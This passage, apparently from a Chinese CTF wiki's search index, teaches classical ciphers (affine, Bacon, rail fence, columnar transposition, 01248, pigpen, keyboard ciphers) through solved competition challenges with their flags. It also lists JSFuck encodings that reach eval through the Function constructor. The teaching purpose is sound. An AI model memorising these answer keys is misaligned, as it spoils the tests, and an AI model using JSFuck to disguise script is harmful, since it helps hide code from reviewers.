'****CENSORED****************' flag = 'TWCTF{*******CENSORED********}' f = open ( 'encrypted' , 'r' ) data = f . read () . strip ( ' \\n ' ) encrypted = [ int ( data [ i : i + 2 ], 16 ) for i in range ( 0 , len ( data ), 2 )] plaindelta = ord ( flag [ 1 ]) - ord ( flag [ 0 ]) cipherdalte = encrypted [ 1 ] - encrypted [ 0 ] a = gmpy . invert ( plaindelta , 251 ) * cipherdalte % 251 b = ( encrypted [ 0 ] - a * ord ( flag [ 0 ])) % 251 a_inv = gmpy . invert ( a , 251 ) result = \"\" for c in encrypted : result += chr (( c - b ) * a_inv % 251 ) print result \u7ed3\u679c\u5982\u4e0b \u279c TWCTF2016-super_express git: ( master ) \u2717 python exploit.py TWCTF { Faster_Than_Shinkansen! }","title":"\u4f8b\u5b50"},{"location":"crypto/classical/others/","text":"\u5176\u5b83\u7c7b\u578b\u52a0\u5bc6 \u00b6 \u57f9\u6839\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u57f9\u6839\u5bc6\u7801\u4f7f\u7528\u4e24\u79cd\u4e0d\u540c\u7684\u5b57\u4f53\uff0c\u4ee3\u8868 A \u548c B\uff0c\u7ed3\u5408\u52a0\u5bc6\u8868\u8fdb\u884c\u52a0\u89e3\u5bc6\u3002 a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB \u4e0a\u9762\u7684\u662f\u5e38\u7528\u7684\u52a0\u5bc6\u8868\u3002\u8fd8\u6709\u53e6\u5916\u7684\u4e00\u79cd\u52a0\u5bc6\u8868\uff0c\u53ef\u8ba4\u4e3a\u662f\u5c06 26 \u4e2a\u5b57\u6bcd\u4ece 0 \u5230 25 \u6392\u5e8f\uff0c\u4ee5\u4e8c\u8fdb\u5236\u8868\u793a\uff0cA \u4ee3\u8868 0\uff0cB \u4ee3\u8868 1\u3002 \u4e0b\u9762\u8fd9\u4e00\u6bb5\u5185\u5bb9\u5c31\u662f\u660e\u6587 steganography \u52a0\u5bc6\u540e\u7684\u5185\u5bb9\uff0c\u6b63\u5e38\u5b57\u4f53\u662f A\uff0c\u7c97\u4f53\u662f B\uff1a T o en co de a mes s age e ac h letter of the pl a i nt ex t i s replaced b y a g rou p of f i ve of th e lett ers 'A' o r 'B' . \u53ef\u4ee5\u770b\u5230\uff0c\u57f9\u6839\u5bc6\u7801\u4e3b\u8981\u6709\u4ee5\u4e0b\u7279\u70b9 \u53ea\u6709\u4e24\u79cd\u5b57\u7b26 \u6bcf\u4e00\u6bb5\u7684\u957f\u5ea6\u4e3a 5 \u52a0\u5bc6\u5185\u5bb9\u4f1a\u6709\u7279\u6b8a\u7684\u5b57\u4f53\u4e4b\u5206\uff0c\u4ea6\u6216\u8005\u5927\u5c0f\u5199\u4e4b\u5206\u3002 \u5de5\u5177 \u00b6 http://rumkin.com/tools/cipher/baconian.php \u6805\u680f\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u6805\u680f\u5bc6\u7801\u628a\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210 N \u4e2a\u4e00\u7ec4\uff0c\u7136\u540e\u628a\u6bcf\u7ec4\u7684\u7b2c 1 \u4e2a\u5b57\u8fde\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u6bb5\u65e0\u89c4\u5f8b\u7684\u8bdd\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1aTHERE IS A CIPHER \u53bb\u6389\u7a7a\u683c\u540e\u53d8\u4e3a THEREISACIPHER \u5206\u6210\u4e24\u680f\uff0c\u4e24\u4e2a\u4e00\u7ec4\u5f97\u5230 TH ER EI SA CI PH ER \u5148\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u518d\u53d6\u51fa\u7b2c\u4e8c\u4e2a\u5b57\u6bcd TEESCPE HRIAIHR \u8fde\u5728\u4e00\u8d77\u5c31\u662f TEESCPEHRIAIHR \u4e0a\u8ff0\u660e\u6587\u4e5f\u53ef\u4ee5\u5206\u4e3a2\u680f\u3002 THEREIS ACIPHER \u7ec4\u5408\u5f97\u5230\u5bc6\u6587 TAHCEIRPEHIESR \u5de5\u5177 \u00b6 https://www.qqxiuzi.cn/bianma/zhalanmima.php \u66f2\u8def\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u66f2\u8def\u5bc6\u7801\uff08Curve Cipher\uff09\u662f\u4e00\u79cd\u6362\u4f4d\u5bc6\u7801\uff0c\u9700\u8981\u4e8b\u5148\u53cc\u65b9\u7ea6\u5b9a\u5bc6\u94a5\uff08\u4e5f\u5c31\u662f\u66f2\u8def\u8def\u5f84\uff09\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1aThe quick brown fox jumps over the lazy dog \u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09 \u52a0\u5bc6\u7684\u56de\u8def\u7ebf\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09 \u5bc6\u6587\uff1agesfc inpho dtmwu qoury zejre hbxva lookT \u5217\u79fb\u4f4d\u52a0\u5bc6 \u00b6 \u539f\u7406 \u00b6 \u5217\u79fb\u4f4d\u5bc6\u7801\uff08Columnar Transposition Cipher\uff09\u662f\u4e00\u79cd\u6bd4\u8f83\u7b80\u5355\uff0c\u6613\u4e8e\u5b9e\u73b0\u7684\u6362\u4f4d\u5bc6\u7801\uff0c\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u89c4\u5219\u5c06\u660e\u6587\u6253\u4e71\u6df7\u5408\u6210\u5bc6\u6587\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002 \u6211\u4eec\u4ee5\u660e\u6587 The quick brown fox jumps over the lazy dog \uff0c\u5bc6\u94a5 how are u \u4e3a\u4f8b\uff1a \u5c06\u660e\u6587\u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff0c\u5982\u679c\u660e\u6587\u4e0d\u80fd\u586b\u5145\u5b8c\u8868\u683c\u53ef\u4ee5\u7ea6\u5b9a\u4f7f\u7528\u67d0\u4e2a\u5b57\u6bcd\u8fdb\u884c\u586b\u5145\uff09 \u5bc6\u94a5\uff1a how are u \uff0c\u6309 how are u \u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u51fa\u73b0\u7684\u5148\u540e\u987a\u5e8f\u8fdb\u884c\u7f16\u53f7\uff0c\u6211\u4eec\u5c31\u6709 a \u4e3a 1\uff0ce \u4e3a 2\uff0ch \u4e3a 3\uff0co \u4e3a 4\uff0cr \u4e3a 5\uff0cu \u4e3a 6\uff0cw \u4e3a 7\uff0c\u6240\u4ee5\u5148\u5199\u51fa a \u5217\uff0c\u5176\u6b21 e \u5217\uff0c\u4ee5\u6b64\u7c7b\u63a8\u5199\u51fa\u7684\u7ed3\u679c\u4fbf\u662f\u5bc6\u6587\uff1a \u5bc6\u6587\uff1a qoury inpho Tkool hbxva uwmtd cfseg erjez \u5de5\u5177 \u00b6 http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/ \u884c\u5217\u6570\u76f8\u7b49 01248 \u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u8be5\u5bc6\u7801\u53c8\u79f0\u4e3a\u4e91\u5f71\u5bc6\u7801\uff0c\u4f7f\u7528 0\uff0c1\uff0c2\uff0c4\uff0c8 \u56db\u4e2a\u6570\u5b57\uff0c\u5176\u4e2d 0 \u7528\u6765\u8868\u793a\u95f4\u9694\uff0c\u5176\u4ed6\u6570\u5b57\u4ee5\u52a0\u6cd5\u53ef\u4ee5\u8868\u793a\u51fa \u5982\uff1a28=10\uff0c124=7\uff0c18=9\uff0c\u518d\u7528 1->26 \u8868\u793a A->Z\u3002 \u53ef\u4ee5\u770b\u51fa\u8be5\u5bc6\u7801\u6709\u4ee5\u4e0b\u7279\u70b9 \u53ea\u6709 0\uff0c1\uff0c2\uff0c4\uff0c8 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5CFF 2016 \u5f71\u4e4b\u5bc6\u7801\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee 8842101220480224404014224202480122 \u6211\u4eec\u6309\u71670\u6765\u8fdb\u884c\u5206\u5272\uff0c\u5982\u4e0b \u5185\u5bb9 \u6570\u5b57 \u5b57\u7b26 88421 8+8+4+2+1=23 W 122 1+2+2=5 E 48 4+8=12 L 2244 2+2+4+4=12 L 4 4 D 142242 1+4+2+2+4+2=15 O 248 2+4+8=14 N 122 1+2+2=5 E \u6240\u4ee5\u6700\u540e\u7684 flag \u4e3a WELLDONE\u3002 JSFuck \u00b6 \u539f\u7406 \u00b6 JSFuck \u53ef\u4ee5\u53ea\u7528 6 \u4e2a\u5b57\u7b26 []()!+ \u6765\u7f16\u5199 JavaScript \u7a0b\u5e8f\u3002\u6bd4\u5982\u6211\u4eec\u60f3\u7528 JSFuck \u6765\u5b9e\u73b0 alert(1) \u4ee3\u7801\u5982\u4e0bu5176\u4ed6\u4e00\u4e9b\u57fa\u672c\u7684\u8868\u8fbe\uff1a false => ! [] true => !! [] undefined => [][[]] NaN => + [ ! []] 0 => + [] 1 => +!+ [] 2 => !+ [] +!+ [] 10 => [ +!+ []] + [ + []] Array => [] Number => + [] String => [] + [] Boolean => ! [] Function => [][ \"filter\" ] eval => [][ \"filter\" ][ \"constructor\" ]( CODE )() window => [][ \"filter\" ][ \"constructor\" ]( \"return this\" )() \u5de5\u5177 \u00b6 JSFuck \u5728\u7ebf\u52a0\u5bc6\u7f51\u7ad9 BrainFuck \u00b6 \u539f\u7406 \u00b6 Brainfuck\uff0c\u662f\u4e00\u79cd\u6781\u5c0f\u5316\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\uff0c\u5b83\u662f\u7531 Urban M\u00fcller \u5728 1993 \u5e74\u521b\u5efa\u7684\u3002\u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e00\u4e2a\u5728\u5c4f\u5e55\u4e0a\u6253\u5370Hello World\uff01\uff0c\u90a3\u4e48\u5bf9\u5e94\u7684\u7a0b\u5e8f\u5982\u4e0b\u3002\u5bf9\u4e8e\u5176\u4e2d\u7684\u539f\u7406\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u81ea\u884c\u7f51\u4e0a\u641c\u7d22\u3002 ++++++++++[>+++++++>++++++++++>+++>+<<<<-] >++.>+.+++++++..+++.>++.<<+++++++++++++++. >.+++.------.--------.>+.>. \u4e0e\u5176\u5bf9\u5e94\u7684\u8fd8\u6709 ook\u3002 \u5de5\u5177 \u00b6 https://www.splitbrain.org/services/ook \u732a\u5708\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u732a\u5708\u5bc6\u7801\u662f\u4e00\u79cd\u4ee5\u683c\u5b50\u4e3a\u57fa\u7840\u7684\u7b80\u5355\u66ff\u4ee3\u5f0f\u5bc6\u7801\uff0c\u683c\u5b50\u5982\u4e0b \u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u660e\u6587\u4e3a X marks the spot \uff0c\u90a3\u4e48\u5bc6\u6587\u5982\u4e0b \u5de5\u5177 \u00b6 http://www.simonsingh.net/The_Black_Chamber/pigpen.html \u821e\u52a8\u7684\u5c0f\u4eba\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u8fd9\u79cd\u5bc6\u7801\u51fa\u81ea\u4e8e\u798f\u5c14\u6469\u65af\u63a2\u6848\u96c6\u3002\u6bcf\u4e00\u4e2a\u8df3\u821e\u7684\u5c0f\u4eba\u5b9e\u9645\u4e0a\u5bf9\u5e94\u7684\u662f\u82f1\u6587\u4e8c\u5341\u516d\u4e2a\u5b57\u6bcd\u4e2d\u7684\u4e00\u4e2a\uff0c\u800c\u5c0f\u4eba\u624b\u4e2d\u7684\u65d7\u5b50\u5219\u8868\u660e\u8be5\u5b57\u6bcd\u662f\u5355\u8bcd\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5982\u679c\u4ec5\u4ec5\u662f\u4e00\u4e2a\u5355\u8bcd\u800c\u4e0d\u662f\u53e5\u5b50\uff0c\u6216\u8005\u662f\u53e5\u5b50\u4e2d\u6700\u540e\u7684\u4e00\u4e2a\u5355\u8bcd\uff0c\u5219\u5355\u8bcd\u4e2d\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4e0d\u5fc5\u4e3e\u65d7\u3002 \u952e\u76d8\u5bc6\u7801 \u00b6 \u6240\u8c13\u952e\u76d8\u5bc6\u7801\uff0c\u5c31\u662f\u91c7\u7528\u624b\u673a\u952e\u76d8\u6216\u8005\u7535\u8111\u952e\u76d8\u8fdb\u884c\u52a0\u5bc6\u3002 \u624b\u673a\u952e\u76d8\u5bc6\u7801 \u00b6 \u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\uff0c\u662f\u6bcf\u4e2a\u6570\u5b57\u952e\u4e0a\u6709 3-4 \u4e2a\u5b57\u6bcd\uff0c\u7528\u4e24\u4f4d\u6570\u5b57\u6765\u8868\u793a\u5b57\u6bcd\uff0c\u4f8b\u5982\uff1aru \u7528\u624b\u673a\u952e\u76d8\u8868\u793a\u5c31\u662f\uff1a7382\uff0c\u90a3\u4e48\u8fd9\u91cc\u5c31\u53ef\u4ee5\u77e5\u9053\u4e86\uff0c\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\u4e0d\u53ef\u80fd\u7528 1 \u5f00\u5934\uff0c\u7b2c\u4e8c\u4f4d\u6570\u5b57\u4e0d\u53ef\u80fd\u8d85\u8fc7 4\uff0c\u89e3\u5bc6\u7684\u65f6\u5019\u53c2\u8003\u6b64 \u5173\u4e8e\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u8fd8\u6709\u53e6\u4e00\u79cd\u65b9\u5f0f\uff0c\u5c31\u662f\u300c\u97f3\u7684\u300d\u5f0f\uff08\u8fd9\u4e00\u70b9\u53ef\u80fd\u6839\u636e\u624b\u673a\u7684\u4e0d\u540c\u4f1a\u6709\u6240\u4e0d\u540c\uff09\uff0c\u5177\u4f53\u53c2\u7167\u624b\u673a\u952e\u76d8\u6765\u6253\uff0c\u4f8b\u5982\uff1a\u300c\u6570\u5b57\u300d\u8868\u793a\u51fa\u6765\u5c31\u662f\uff1a748 94\u3002\u5728\u624b\u673a\u952e\u76d8\u4e0a\u9762\u6309\u4e0b\u8fd9\u51e0\u4e2a\u6570\uff0c\u5c31\u4f1a\u51fa\uff1a\u300c\u6570\u5b57\u300d\u7684\u62fc\u97f3\u3002 \u7535\u8111\u952e\u76d8\u68cb\u76d8 \u00b6 \u7535\u8111\u952e\u76d8\u68cb\u76d8\u52a0\u5bc6\uff0c\u5229\u7528\u4e86\u7535\u8111\u7684\u68cb\u76d8\u65b9\u9635\u3002 \u7535\u8111\u952e\u76d8\u5750\u6807 \u00b6 \u7535\u8111\u952e\u76d8\u5750\u6807\u52a0\u5bc6\uff0c\u5229\u7528\u952e\u76d8\u4e0a\u9762\u7684\u5b57\u6bcd\u884c\u548c\u6570\u5b57\u884c\u6765\u52a0\u5bc6\uff0c\u4f8b\uff1abye \u7528\u7535\u8111\u952e\u76d8 XY \u8868\u793a\u5c31\u662f\uff1a351613 \u7535\u8111\u952e\u76d8 QWE \u00b6 \u7535\u8111\u952e\u76d8 QWE \u52a0\u5bc6\u6cd5\uff0c\u5c31\u662f\u7528\u5b57\u6bcd\u8868\u66ff\u6362\u952e\u76d8\u4e0a\u9762\u7684\u6392\u5217\u987a\u5e8f\u3002 \u952e\u76d8\u5e03\u5c40\u52a0\u5bc6 \u00b6 \u7b80\u5355\u5730\u8bf4\u5c31\u662f\u6839\u636e\u7ed9\u5b9a\u7684\u5b57\u7b26\u5728\u952e\u76d8\u4e0a\u7684\u6837\u5b50\u6765\u8fdb\u884c\u52a0\u5bc6\u3002 0CTF 2014 classic \u00b6 \u5c0f\u4e01\u4e01\u53d1\u73b0\u81ea\u5df1\u7f6e\u8eab\u4e8e\u4e00\u4e2a\u8be1\u5f02\u7684\u623f\u95f4\uff0c\u9762\u524d\u53ea\u6709\u4e00\u6247\u523b\u7740\u5947\u602a\u5b57\u7b26\u7684\u95e8\u3002 \u4ed6\u53d1\u73b0\u95e8\u8fb9\u4e0a\u8fd8\u6709\u4e00\u9053\u5bc6\u7801\u9501\uff0c\u4f3c\u4e4e\u8981\u8f93\u5165\u5bc6\u7801\u624d\u80fd\u5f00\u95e8\u3002\u30024esxcft5 rdcvgt 6tfc78uhg 098ukmnb \u53d1\u73b0\u8fd9\u4e48\u4e71\uff0c\u8fd8\u540c\u65f6\u5305\u62ec\u6570\u5b57\u548c\u5b57\u6bcd\u731c\u60f3\u53ef\u80fd\u662f\u952e\u76d8\u5bc6\u7801\uff0c\u8bd5\u7740\u5728\u952e\u76d8\u4e0a\u6309\u7167\u5b57\u6bcd\u987a\u5e8f\u63cf\u7ed8\u4e00\u4e0b\uff0c\u53ef\u5f97\u52300ops\u5b57\u6837\uff0c\u731c\u6d4b\u5c31\u662fflag\u4e86\u3002 2017\u5e74xman\u9009\u62d4\u8d5b\u2014\u2014\u4e00\u4e8c\u4e09\uff0c\u6728\u5934\u4eba \u00b6 \u6211\u6570123\u6728\u5934\u4eba\uff0c\u518d\u4e0d\u884c\u52a8\u5c31\u8981\u88ab\u6263\u5206\u3002 23731263111628163518122316391715262121 \u5bc6\u7801\u683c\u5f0fxman{flag} \u9898\u76ee\u4e2d\u6709\u5f88\u660e\u663e\u7684\u63d0\u793a123\uff0c\u90a3\u4e48\u5c31\u81ea\u7136\u9700\u8981\u8054\u60f3\u5230\u952e\u76d8\u5bc6\u7801\u4e2d\u7535\u8111\u952e\u76d8\u5750\u6807\u5bc6\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u524d\u51e0\u4e2a\u6570\u5b57\u7b2c\u4e8c\u4e2a\u6570\u5b57\u90fd\u662f1-3\u8303\u56f4\u5185\u7684\uff0c\u4e5f\u9a8c\u8bc1\u4e86\u6211\u4eec\u7684\u731c\u6d4b\u3002\u4e8e\u662f 23-x 73-m 12-a 63-n 11-q \u4e0d\u5bf9\u5440\uff0c\u5bc6\u7801\u683c\u5f0f\u662f xman{ \uff0c\u7b2c\u56db\u4e2a\u5b57\u7b26\u662f { \uff0c\u4e8e\u662f\u770b\u4e86\u770b { \u7684\u4f4d\u7f6e\uff0c\u5176\u5e76\u6ca1\u6709\u5bf9\u5e94\u7684\u6a2a\u5750\u6807\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u624b\u52a8\u628a\u5b83\u89c6\u4e3a 11 \u7684\u8bdd\uff0c\u90a3\u4e48111\u5c31\u662f { \u3002\u7136\u540e\u4f9d\u6b21\u5f80\u540e\u63a8\uff0c\u53d1\u73b0\u786e\u5b9e\u53ef\u884c\uff0c\uff0c\u6700\u540e\u518d\u628a 121 \u89c6\u4e3a } \u5373\u53ef\u5f97\u5230 flag\u3002 xman{hintisenough} \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u6ce8\u610f\u8fc1\u79fb\u6027\uff0c\u4e0d\u80fd\u5355\u7eaf\u5730\u7167\u642c\u4e00\u4e9b\u5df2\u6709\u7684\u77e5\u8bc6\u3002 \u9898\u76ee \u00b6 \u5b9e\u9a8c\u5427 \u5947\u602a\u7684\u77ed\u4fe1","title":"\u5176\u5b83\u7c7b\u578b\u52a0\u5bc6"},{"location":"crypto/classical/others/#_1","text":"","title":"\u5176\u5b83\u7c7b\u578b\u52a0\u5bc6"},{"location":"crypto/classical/others/#_2","text":"","title":"\u57f9\u6839\u5bc6\u7801"},{"location":"crypto/classical/others/#_3","text":"\u57f9\u6839\u5bc6\u7801\u4f7f\u7528\u4e24\u79cd\u4e0d\u540c\u7684\u5b57\u4f53\uff0c\u4ee3\u8868 A \u548c B\uff0c\u7ed3\u5408\u52a0\u5bc6\u8868\u8fdb\u884c\u52a0\u89e3\u5bc6\u3002 a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB \u4e0a\u9762\u7684\u662f\u5e38\u7528\u7684\u52a0\u5bc6\u8868\u3002\u8fd8\u6709\u53e6\u5916\u7684\u4e00\u79cd\u52a0\u5bc6\u8868\uff0c\u53ef\u8ba4\u4e3a\u662f\u5c06 26 \u4e2a\u5b57\u6bcd\u4ece 0 \u5230 25 \u6392\u5e8f\uff0c\u4ee5\u4e8c\u8fdb\u5236\u8868\u793a\uff0cA \u4ee3\u8868 0\uff0cB \u4ee3\u8868 1\u3002 \u4e0b\u9762\u8fd9\u4e00\u6bb5\u5185\u5bb9\u5c31\u662f\u660e\u6587 steganography \u52a0\u5bc6\u540e\u7684\u5185\u5bb9\uff0c\u6b63\u5e38\u5b57\u4f53\u662f A\uff0c\u7c97\u4f53\u662f B\uff1a T o en co de a mes s age e ac h letter of the pl a i nt ex t i s replaced b y a g rou p of f i ve of th e lett ers 'A' o r 'B' . \u53ef\u4ee5\u770b\u5230\uff0c\u57f9\u6839\u5bc6\u7801\u4e3b\u8981\u6709\u4ee5\u4e0b\u7279\u70b9 \u53ea\u6709\u4e24\u79cd\u5b57\u7b26 \u6bcf\u4e00\u6bb5\u7684\u957f\u5ea6\u4e3a 5 \u52a0\u5bc6\u5185\u5bb9\u4f1a\u6709\u7279\u6b8a\u7684\u5b57\u4f53\u4e4b\u5206\uff0c\u4ea6\u6216\u8005\u5927\u5c0f\u5199\u4e4b\u5206\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_4","text":"http://rumkin.com/tools/cipher/baconian.php","title":"\u5de5\u5177"},{"location":"crypto/classical/others/#_5","text":"","title":"\u6805\u680f\u5bc6\u7801"},{"location":"crypto/classical/others/#_6","text":"\u6805\u680f\u5bc6\u7801\u628a\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210 N \u4e2a\u4e00\u7ec4\uff0c\u7136\u540e\u628a\u6bcf\u7ec4\u7684\u7b2c 1 \u4e2a\u5b57\u8fde\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u6bb5\u65e0\u89c4\u5f8b\u7684\u8bdd\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1aTHERE IS A CIPHER \u53bb\u6389\u7a7a\u683c\u540e\u53d8\u4e3a THEREISACIPHER \u5206\u6210\u4e24\u680f\uff0c\u4e24\u4e2a\u4e00\u7ec4\u5f97\u5230 TH ER EI SA CI PH ER \u5148\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u518d\u53d6\u51fa\u7b2c\u4e8c\u4e2a\u5b57\u6bcd TEESCPE HRIAIHR \u8fde\u5728\u4e00\u8d77\u5c31\u662f TEESCPEHRIAIHR \u4e0a\u8ff0\u660e\u6587\u4e5f\u53ef\u4ee5\u5206\u4e3a2\u680f\u3002 THEREIS ACIPHER \u7ec4\u5408\u5f97\u5230\u5bc6\u6587 TAHCEIRPEHIESR","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_7","text":"https://www.qqxiuzi.cn/bianma/zhalanmima.php","title":"\u5de5\u5177"},{"location":"crypto/classical/others/#_8","text":"","title":"\u66f2\u8def\u5bc6\u7801"},{"location":"crypto/classical/others/#_9","text":"\u66f2\u8def\u5bc6\u7801\uff08Curve Cipher\uff09\u662f\u4e00\u79cd\u6362\u4f4d\u5bc6\u7801\uff0c\u9700\u8981\u4e8b\u5148\u53cc\u65b9\u7ea6\u5b9a\u5bc6\u94a5\uff08\u4e5f\u5c31\u662f\u66f2\u8def\u8def\u5f84\uff09\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1aThe quick brown fox jumps over the lazy dog \u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09 \u52a0\u5bc6\u7684\u56de\u8def\u7ebf\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09 \u5bc6\u6587\uff1agesfc inpho dtmwu qoury zejre hbxva lookT","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_10","text":"","title":"\u5217\u79fb\u4f4d\u52a0\u5bc6"},{"location":"crypto/classical/others/#_11","text":"\u5217\u79fb\u4f4d\u5bc6\u7801\uff08Columnar Transposition Cipher\uff09\u662f\u4e00\u79cd\u6bd4\u8f83\u7b80\u5355\uff0c\u6613\u4e8e\u5b9e\u73b0\u7684\u6362\u4f4d\u5bc6\u7801\uff0c\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u89c4\u5219\u5c06\u660e\u6587\u6253\u4e71\u6df7\u5408\u6210\u5bc6\u6587\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002 \u6211\u4eec\u4ee5\u660e\u6587 The quick brown fox jumps over the lazy dog \uff0c\u5bc6\u94a5 how are u \u4e3a\u4f8b\uff1a \u5c06\u660e\u6587\u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff0c\u5982\u679c\u660e\u6587\u4e0d\u80fd\u586b\u5145\u5b8c\u8868\u683c\u53ef\u4ee5\u7ea6\u5b9a\u4f7f\u7528\u67d0\u4e2a\u5b57\u6bcd\u8fdb\u884c\u586b\u5145\uff09 \u5bc6\u94a5\uff1a how are u \uff0c\u6309 how are u \u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u51fa\u73b0\u7684\u5148\u540e\u987a\u5e8f\u8fdb\u884c\u7f16\u53f7\uff0c\u6211\u4eec\u5c31\u6709 a \u4e3a 1\uff0ce \u4e3a 2\uff0ch \u4e3a 3\uff0co \u4e3a 4\uff0cr \u4e3a 5\uff0cu \u4e3a 6\uff0cw \u4e3a 7\uff0c\u6240\u4ee5\u5148\u5199\u51fa a \u5217\uff0c\u5176\u6b21 e \u5217\uff0c\u4ee5\u6b64\u7c7b\u63a8\u5199\u51fa\u7684\u7ed3\u679c\u4fbf\u662f\u5bc6\u6587\uff1a \u5bc6\u6587\uff1a qoury inpho Tkool hbxva uwmtd cfseg erjez","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_12","text":"http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/ \u884c\u5217\u6570\u76f8\u7b49","title":"\u5de5\u5177"},{"location":"crypto/classical/others/#01248","text":"","title":"01248 \u5bc6\u7801"},{"location":"crypto/classical/others/#_13","text":"\u8be5\u5bc6\u7801\u53c8\u79f0\u4e3a\u4e91\u5f71\u5bc6\u7801\uff0c\u4f7f\u7528 0\uff0c1\uff0c2\uff0c4\uff0c8 \u56db\u4e2a\u6570\u5b57\uff0c\u5176\u4e2d 0 \u7528\u6765\u8868\u793a\u95f4\u9694\uff0c\u5176\u4ed6\u6570\u5b57\u4ee5\u52a0\u6cd5\u53ef\u4ee5\u8868\u793a\u51fa \u5982\uff1a28=10\uff0c124=7\uff0c18=9\uff0c\u518d\u7528 1->26 \u8868\u793a A->Z\u3002 \u53ef\u4ee5\u770b\u51fa\u8be5\u5bc6\u7801\u6709\u4ee5\u4e0b\u7279\u70b9 \u53ea\u6709 0\uff0c1\uff0c2\uff0c4\uff0c8","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_14","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5CFF 2016 \u5f71\u4e4b\u5bc6\u7801\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee 8842101220480224404014224202480122 \u6211\u4eec\u6309\u71670\u6765\u8fdb\u884c\u5206\u5272\uff0c\u5982\u4e0b \u5185\u5bb9 \u6570\u5b57 \u5b57\u7b26 88421 8+8+4+2+1=23 W 122 1+2+2=5 E 48 4+8=12 L 2244 2+2+4+4=12 L 4 4 D 142242 1+4+2+2+4+2=15 O 248 2+4+8=14 N 122 1+2+2=5 E \u6240\u4ee5\u6700\u540e\u7684 flag \u4e3a WELLDONE\u3002","title":"\u4f8b\u5b50"},{"location":"crypto/classical/others/#jsfuck","text":"","title":"JSFuck"},{"location":"crypto/classical/others/#_15","text":"JSFuck \u53ef\u4ee5\u53ea\u7528 6 \u4e2a\u5b57\u7b26 []()!+ \u6765\u7f16\u5199 JavaScript \u7a0b\u5e8f\u3002\u6bd4\u5982\u6211\u4eec\u60f3\u7528 JSFuck \u6765\u5b9e\u73b0 alert(1) \u4ee3\u7801\u5982\u4e0bu5176\u4ed6\u4e00\u4e9b\u57fa\u672c\u7684\u8868\u8fbe\uff1a false => ! [] true => !! [] undefined => [][[]] NaN => + [ ! []] 0 => + [] 1 => +!+ [] 2 => !+ [] +!+ [] 10 => [ +!+ []] + [ + []] Array => [] Number => + [] String => [] + [] 